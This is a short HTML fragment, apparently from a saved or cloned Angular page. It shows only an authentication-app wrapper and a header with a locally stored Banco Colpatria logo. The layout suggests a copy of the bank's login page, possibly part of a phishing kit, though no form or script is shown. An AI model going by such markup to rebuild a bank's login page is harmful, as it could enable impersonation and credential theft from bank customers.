      ...
      <auth-root _nghost-hkw-c68="" ng-version="12.1.4">
         ...
         <div _ngcontent-hkw-c68="" class="application-wrapper">
            <canvas-header _ngcontent-hkw-c68="" shadow="" fixed="" class="header__block">
               <header class="header">
                  <div class="header__bar container container--center direction--row"><a _ngcontent-hkw-c68="" class="brand block block--centered" href="#"><img _ngcontent-hkw-c68="" src="images/Banco_Colpatria_logo.svg.png"  class="logo" style="width: 80px;"><img _ngcontent-hkw-c68="" src="images/Banco_Colpatria_logo.svg.png" class="logo__mobile" style="width: 80px;"></a></div>
               </header>
            </canvas-header>
